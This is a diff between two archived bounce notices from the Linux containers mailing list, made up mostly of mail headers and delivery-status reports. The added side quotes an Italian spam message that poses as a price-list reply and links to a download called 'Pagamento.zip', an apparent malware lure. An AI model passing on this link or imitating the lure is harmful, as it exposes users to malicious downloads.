@@ -1,9 +1,9 @@
-From: Mail Delivery Subsystem <MAILER-DAEMON-CeJsjAxUeuLHNbGrPgXee16hYfS7NtTn@public.gmane.org>
-Subject: Returned mail: see transcript for details
-Date: Tue, 3 Apr 2012 01:14:37 +0200
-Message-ID: <201204022314.q32NEbiu014472@m-07.th.seeweb.it>
+From: MAILER-DAEMON-idwLdIvw9MSUjRwoT2X+aTUZDU+1vuVT@public.gmane.org (Mail Delivery System)
+Subject: Undelivered Mail Returned to Sender
+Date: Tue,  3 Apr 2012 01:34:42 +0200 (CEST)
+Message-ID: <20120402233442.89930F876EE@mailbox7.omitech.it>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============7583342745159764150=="
+Content-Type: multipart/mixed; boundary="===============8567134106933319336=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -17,98 +17,98 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-This is a MIME-encapsulated message
+This is a MIME-encapsulated message.
 
---===============7583342745159764150==
+--===============8567134106933319336==
 Content-Type: multipart/report; report-type=delivery-status;
-	boundary="q32NEbiu014472.1333408477/m-07.th.seeweb.it"
+	boundary="17423F87A80.1333409682/mailbox7.omitech.it"
+Content-Transfer-Encoding: 7bit
 
-This is a MIME-encapsulated message
+This is a MIME-encapsulated message.
 
---q32NEbiu014472.1333408477/m-07.th.seeweb.it
+--17423F87A80.1333409682/mailbox7.omitech.it
+Content-Description: Notification
+Content-Type: text/plain; charset=us-ascii
 
-The original message was received at Tue, 3 Apr 2012 01:14:25 +0200
-from 184-106-135-128.static.cloud-ips.com [184.106.135.128]
+This is the mail system at host mailbox7.omitech.it.
 
-   ----- The following addresses had permanent fatal errors -----
-<nadiamathdd-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>
-    (reason: 550 5.1.1 <nadiamathdd-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>... User unknown)
-<nadiamatho-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>
-    (reason: 550 5.1.1 <nadiamatho-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>... User unknown)
-<pre-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>
-    (reason: 550 5.1.1 <pre-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>... User unknown)
-<re-mail_system-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>
-    (reason: 550 5.1.1 <re-mail_system-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>... User unknown)
+I'm sorry to have to inform you that your message could not
+be delivered to one or more recipients. It's attached below.
 
-   ----- Transcript of session follows -----
-... while talking to mail.primolevi.bollate.mi.it.:
->>> DATA
-<<< 550 5.1.1 <re-mail_system-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>... User unknown
-550 5.1.1 <re-mail_system-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>... User unknown
-<<< 550 5.1.1 <pre-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>... User unknown
-550 5.1.1 <pre-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>... User unknown
-<<< 550 5.1.1 <nadiamatho-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>... User unknown
-550 5.1.1 <nadiamatho-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>... User unknown
-<<< 550 5.1.1 <nadiamathdd-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>... User unknown
-550 5.1.1 <nadiamathdd-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>... User unknown
+For further assistance, please send mail to postmaster.
 
---q32NEbiu014472.1333408477/m-07.th.seeweb.it
+If you do so, please include this problem report. You can
+delete your own text from the attached returned message.
+
+                   The mail system
+
+<giovanna.bianchini.bianchinisrl.it-idwLdIvw9MSUjRwoT2X+aTUZDU+1vuVT@public.gmane.org> (expanded from
+    <giovanna.bianchini-lY0/J4MwpJRy66B6L1KpYw@public.gmane.org>): temporary failure
+
+--17423F87A80.1333409682/mailbox7.omitech.it
+Content-Description: Delivery report
 Content-Type: message/delivery-status
 
-Reporting-MTA: dns; m-07.th.seeweb.it
-Received-From-MTA: DNS; 184-106-135-128.static.cloud-ips.com
-Arrival-Date: Tue, 3 Apr 2012 01:14:25 +0200
+Reporting-MTA: dns; mailbox7.omitech.it
+X-Postfix-Queue-ID: 17423F87A80
+X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+Arrival-Date: Tue,  3 Apr 2012 00:07:15 +0200 (CEST)
 
-Final-Recipient: RFC822; nadiamathdd-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org
+Final-Recipient: rfc822; giovanna.bianchini.bianchinisrl.it-idwLdIvw9MSUjRwoT2X+aTUZDU+1vuVT@public.gmane.org
+Original-Recipient: rfc822;giovanna.bianchini-lY0/J4MwpJRy66B6L1KpYw@public.gmane.org
 Action: failed
-Status: 5.1.1
-Remote-MTA: DNS; mail.primolevi.bollate.mi.it
-Diagnostic-Code: SMTP; 550 5.1.1 <nadiamathdd-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>... User unknown
-Last-Attempt-Date: Tue, 3 Apr 2012 01:14:36 +0200
+Status: 4.3.0
+Diagnostic-Code: x-unix; temporary failure
 
-Final-Recipient: RFC822; nadiamatho-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org
-Action: failed
-Status: 5.1.1
-Remote-MTA: DNS; mail.primolevi.bollate.mi.it
-Diagnostic-Code: SMTP; 550 5.1.1 <nadiamatho-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>... User unknown
-Last-Attempt-Date: Tue, 3 Apr 2012 01:14:36 +0200
+--17423F87A80.1333409682/mailbox7.omitech.it
+Content-Description: Undelivered Message
+Content-Type: message/rfc822
+Content-Transfer-Encoding: 7bit
 
-Final-Recipient: RFC822; pre-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org
-Action: failed
-Status: 5.1.1
-Remote-MTA: DNS; mail.primolevi.bollate.mi.it
-Diagnostic-Code: SMTP; 550 5.1.1 <pre-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>... User unknown
-Last-Attempt-Date: Tue, 3 Apr 2012 01:14:36 +0200
-
-Final-Recipient: RFC822; re-mail_system-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org
-Action: failed
-Status: 5.1.1
-Remote-MTA: DNS; mail.primolevi.bollate.mi.it
-Diagnostic-Code: SMTP; 550 5.1.1 <re-mail_system-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>... User unknown
-Last-Attempt-Date: Tue, 3 Apr 2012 01:14:36 +0200
-
---q32NEbiu014472.1333408477/m-07.th.seeweb.it
-Content-Type: text/rfc822-headers
-
-Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: from 184.106.135.128 (184-106-135-128.static.cloud-ips.com [184.106.135.128])
-	(authenticated bits=0)
-	by m-07.th.seeweb.it (8.14.3/8.14.3/Debian-9.4) with ESMTP id q32NEMiu014450;
-	Tue, 3 Apr 2012 01:14:25 +0200
-Received: from 184.106.135.128 (liG-21-60 [184.106.135.128]) by 184.106.135.128 (mailer) with SMTP id lGt7WcGU8GDS for <nadiamathdd-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>; Tue, 03 Apr 2012 00:21:38 +0100
-Date: Tue, 03 Apr 2012 00:21:38 +0100
-From: "service" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Message-ID: <45910886.39055123314977-P1IqAXsvF9WDs0zCBJ1y4Q@public.gmane.org>
-To: <nadiamathdd-qJo0ZJa9hHYW2zVpeLv+cYq/cKL7GP7o@public.gmane.org>
-Subject: {LINE[s9]}
+Received: from localhost (localhost [127.0.0.1])
+	by mailbox7.omitech.it (Postfix) with ESMTP id 17423F87A80
+	for <giovanna.bianchini-lY0/J4MwpJRy66B6L1KpYw@public.gmane.org>; Tue,  3 Apr 2012 00:07:15 +0200 (CEST)
+Received: from mailbox7.omitech.it ([127.0.0.1])
+	by localhost (mailbox7.omitech.it [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id 2S8WyXuwNM+i for <giovanna.bianchini-lY0/J4MwpJRy66B6L1KpYw@public.gmane.org>;
+	Tue,  3 Apr 2012 00:07:13 +0200 (CEST)
+X-Greylist: delayed 00:09:56 by SQLgrey-1.6.8
+Received: from smtpsrv.playnet.it (smtpsrv-249.playnet.it [62.48.32.249])
+	by mailbox7.omitech.it (Postfix) with ESMTP id 54D24F4C77B
+	for <giovanna.bianchini-lY0/J4MwpJRy66B6L1KpYw@public.gmane.org>; Tue,  3 Apr 2012 00:07:13 +0200 (CEST)
+Received: from LOCAL.HOST (static.85-10-211-116.clients.your-server.de [85.10.211.116])
+	by smtpsrv.playnet.it (Postfix) with ESMTPA id 0971F2CA2C;
+	Mon,  2 Apr 2012 23:57:12 +0200 (CEST)
+Received: from [192.168.137.100] by LOCAL.HOST id trbfSOq8EE3f; Mon, 02 Apr 2012 23:57:11 +0200
+Message-ID: <003001cd111b$8cf0e880$6489a8c0-7PjSQ+wCsSudNYLACK+ndg@public.gmane.org>
+From: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <prenjmegen-VGgt2q2+T+FeoWH0uzbU5w@public.gmane.org>
+Subject: Re: prezzo corrente
+Date: Mon, 02 Apr 2012 23:57:11 +0200
 MIME-Version: 1.0
 Content-type: text/plain; charset=us-ascii 
-Content-Transfer-Encoding: 8bit
-
---q32NEbiu014472.1333408477/m-07.th.seeweb.it--
+Content-Transfer-Encoding: quoted-printable
 
 
---===============7583342745159764150==
+
+Gentile, prenjmegen-VGgt2q2+T+FECS10DBIrLA@public.gmane.org
+
+>> Invia-to-date listino prezzi per favore
+
+Ciao.
+Potete scaricare alla
+http://alaein.com/materiale/Pagamento.zip
+
+
+=3D=3D
+Support,
+Tel./Fax.: (051) 635 15 02=20
+
+
+
+--17423F87A80.1333409682/mailbox7.omitech.it--
+
+--===============8567134106933319336==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -118,4 +118,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============7583342745159764150==--
+--===============8567134106933319336==--
